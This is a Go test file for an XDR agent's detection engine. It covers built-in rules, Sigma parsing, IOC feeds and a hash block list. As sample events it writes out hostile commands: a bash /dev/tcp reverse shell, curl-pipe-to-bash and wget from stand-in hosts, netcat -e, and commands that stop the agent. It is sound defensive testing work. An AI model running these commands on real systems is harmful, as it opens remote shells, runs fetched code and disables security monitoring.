package detect

import (
	"slices"
	"strings"
	"testing"

	"github.com/Bogan1011/xdr-agent/internal/server/store"
)

func ruleIDs(ms []Match) []string {
	var out []string
	for _, m := range ms {
		out = append(out, m.RuleID)
	}
	slices.Sort(out)
	return out
}

func TestBuiltinRules(t *testing.T) {
	rules, err := Builtin()
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := YaraBundle(rules); err != nil {
		t.Fatalf("yara bundle: %v", err)
	}
	iocs := []store.IOC{
		{Type: "sha256", Value: strings.Repeat("ab", 32), Severity: "critical"},
		{Type: "ip", Value: "203.0.113.0/24"},
		{Type: "ip", Value: "198.51.100.7"},
		{Type: "domain", Value: "evil.example"},
	}
	e, errs := NewEngine(rules, iocs)
	if len(errs) > 0 {
		t.Fatal(errs)
	}
	cases := []struct {
		name string
		ev   store.Event
		want []string
	}{
		{"test rule", store.Event{Type: "process_exec", Exe: "/usr/bin/echo", Args: "echo xdr-test-detection"},
			[]string{"xdr-test-detection"}},
		{"reverse shell", store.Event{Type: "process_exec", Exe: "/usr/bin/bash", Args: `bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"`},
			[]string{"lnx-reverse-shell-dev-tcp"}},
		{"curl pipe sh", store.Event{Type: "process_exec", Exe: "/bin/sh", Args: `sh -c "curl -s http://x.example/a.sh | bash"`},
			[]string{"lnx-download-pipe-shell"}},
		{"nc -e", store.Event{Type: "process_exec", Exe: "/usr/bin/nc", Args: "nc 10.0.0.1 4444 -e /bin/sh"},
			[]string{"lnx-netcat-exec"}},
		{"plain nc", store.Event{Type: "process_exec", Exe: "/usr/bin/nc", Args: "nc -zv 10.0.0.1 22"}, nil},
		{"tmp exec + bad hash", store.Event{Type: "process_exec", Exe: "/tmp/x", Args: "/tmp/x", SHA256: strings.Repeat("AB", 32)},
			[]string{"ioc:sha256", "lnx-exec-from-tmp"}},
		{"authorized_keys", store.Event{Type: "file_modify", Path: "/root/.ssh/authorized_keys"},
			[]string{"lnx-ssh-authorized-keys"}},
		{"shadow delete is not file_event", store.Event{Type: "file_delete", Path: "/etc/shadow"}, nil},
		{"systemd unit", store.Event{Type: "file_create", Path: "/etc/systemd/system/evil.service"},
			[]string{"lnx-systemd-service-created"}},
		{"systemd dir only", store.Event{Type: "file_create", Path: "/etc/systemd/system/foo.conf"}, nil},
		{"ld preload", store.Event{Type: "file_modify", Path: "/etc/ld.so.preload"}, []string{"lnx-ld-preload"}},
		{"agent sigterm ignored", store.Event{Type: "agent_tamper", Path: "signal_ignored", Args: "terminated ignored"},
			[]string{"xdr-agent-tamper"}},
		{"agent maintenance", store.Event{Type: "agent_tamper", Path: "maintenance"}, []string{"xdr-agent-maintenance"}},
		{"systemctl stop agent", store.Event{Type: "process_exec", Exe: "/usr/bin/systemctl", Args: "systemctl stop xdr-agent"},
			[]string{"lnx-xdr-agent-tamper-command"}},
		{"chattr agent", store.Event{Type: "process_exec", Exe: "/usr/bin/chattr", Args: "chattr -i /usr/local/bin/xdr-agent"},
			[]string{"lnx-xdr-agent-tamper-command"}},
		{"systemctl status agent", store.Event{Type: "process_exec", Exe: "/usr/bin/systemctl", Args: "systemctl status xdr-agent"}, nil},
		{"webshell", store.Event{Type: "process_exec", Exe: "/usr/bin/dash", ParentExe: "/usr/sbin/php-fpm8.1"},
			[]string{"lnx-webserver-shell"}},
		{"c2 port + ioc net", store.Event{Type: "net_connect", RemoteAddr: "203.0.113.9", RemotePort: 4444},
			[]string{"ioc:ip", "lnx-suspicious-port"}},
		{"ioc ip", store.Event{Type: "net_connect", RemoteAddr: "::ffff:198.51.100.7", RemotePort: 443}, []string{"ioc:ip"}},
		{"loopback 4444", store.Event{Type: "net_connect", RemoteAddr: "127.0.0.1", RemotePort: 4444}, nil},
		{"domain", store.Event{Type: "process_exec", Exe: "/usr/bin/wget", Args: "wget http://cdn.evil.example/x"}, []string{"ioc:domain"}},
		{"setuid", store.Event{Type: "process_exec", Exe: "/usr/bin/chmod", Args: "chmod 4755 /tmp/sh"}, []string{"lnx-setuid-bit"}},
		{"chmod normal", store.Event{Type: "process_exec", Exe: "/usr/bin/chmod", Args: "chmod 755 /tmp/sh"}, nil},
		{"history read", store.Event{Type: "process_exec", Exe: "/usr/bin/cat", Args: "cat .bash_history"}, nil},
		{"yara", store.Event{Type: "yara_match", Path: "/tmp/eicar.com", Args: "EICAR_Test_File"}, []string{"yara:EICAR_Test_File"}},
		{"exec blocked, no duplicate ioc alert", store.Event{Type: "exec_blocked", Exe: "/tmp/x", SHA256: strings.Repeat("ab", 32)},
			[]string{"xdr-exec-blocked"}},
		{"fim shadow", store.Event{Type: "fim_change", Path: "/etc/shadow", Args: "content old_sha256=00"}, []string{"xdr-fim-critical"}},
		{"fim binary", store.Event{Type: "fim_change", Path: "/usr/bin/ls", Args: "added"}, []string{"xdr-fim-system-binary"}},
		{"fim other", store.Event{Type: "fim_change", Path: "/etc/hosts", Args: "permissions"}, []string{"xdr-fim-change"}},
		{"firewall restored", store.Event{Type: "agent_tamper", Path: "firewall_restored"}, []string{"xdr-agent-tamper"}},
	}
	for _, c := range cases {
		got := ruleIDs(e.Evaluate(&c.ev))
		if !slices.Equal(got, c.want) {
			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
		}
	}
	for _, m := range e.Evaluate(&store.Event{Type: "yara_match", Args: "EICAR_Test_File"}) {
		if m.Severity != "low" {
			t.Errorf("EICAR severity = %s", m.Severity)
		}
	}
}

func TestSigmaErrors(t *testing.T) {
	for _, src := range []string{
		"title: x\nlevel: high\ndetection: {s: {exe: a}, condition: s}",
		"id: a\ntitle: x\nlevel: bad\ndetection: {s: {exe: a}, condition: s}",
		"id: a\ntitle: x\nlevel: high\ndetection: {s: {nope: a}, condition: s}",
		"id: a\ntitle: x\nlevel: high\ndetection: {s: {exe|foo: a}, condition: s}",
		"id: a\ntitle: x\nlevel: high\ndetection: {s: {exe: a}, condition: t}",
		"id: a\ntitle: x\nlevel: high\nresponse: [reboot]\ndetection: {s: {exe: a}, condition: s}",
		"id: a\ntitle: x\nlevel: high\nlogsource: {category: dns}\ndetection: {s: {exe: a}, condition: s}",
	} {
		if _, err := ParseSigma(src); err == nil {
			t.Errorf("ParseSigma(%q) succeeded", src)
		}
	}
}

func TestSigmaWildcardsAndOf(t *testing.T) {
	s, err := ParseSigma(`id: a
title: t
level: low
detection:
  sel_a: {exe: '/usr/*/py*'}
  sel_b: {user: root}
  sel_c: {cmdline|contains|all: [foo, bar]}
  condition: 2 of sel_*
`)
	if err != nil {
		t.Fatal(err)
	}
	if !s.Match(&store.Event{Exe: "/usr/bin/python3", User: "ROOT"}) {
		t.Error("expected match on a+b")
	}
	if s.Match(&store.Event{Exe: "/usr/bin/python3", Args: "foo"}) {
		t.Error("unexpected match")
	}
	if !s.Match(&store.Event{User: "root", Args: "bar foo"}) {
		t.Error("expected match on b+c")
	}
}

func TestParseFeed(t *testing.T) {
	in := "# header\n\"2024-01-01\",\"http://bad.example:8080/x.sh\",\"online\"\nhttps://Other.example/p\n;c\n1.2.3.4\n"
	got, err := ParseFeed("domain", strings.NewReader(in), 10)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(got, []string{"bad.example", "other.example"}) {
		t.Errorf("domains = %v", got)
	}
	got, _ = ParseFeed("ip", strings.NewReader(in), 10)
	if !slices.Equal(got, []string{"1.2.3.4"}) {
		t.Errorf("ips = %v", got)
	}
}

func TestBlockList(t *testing.T) {
	a, b := strings.Repeat("bb", 32), strings.Repeat("aa", 32)
	iocs := []store.IOC{
		{Type: "sha256", Value: a, FeedID: 3}, {Type: "sha256", Value: b}, {Type: "sha256", Value: b, FeedID: 3},
		{Type: "ip", Value: "10.0.0.1"}, {Type: "sha256", Value: "nothex"},
	}
	got := BlockList(iocs, 10)
	if len(got) != 64 || got[0] != 0xaa || got[32] != 0xbb {
		t.Fatalf("block list = %x", got)
	}
	// Capped lists keep manual indicators first.
	if got := BlockList(iocs, 1); len(got) != 32 || got[0] != 0xaa {
		t.Fatalf("capped block list = %x", got)
	}
	if ContentVersion("", nil) != "" || ContentVersion("", got) == ContentVersion("", nil) {
		t.Fatal("content version must change with the block list")
	}
}
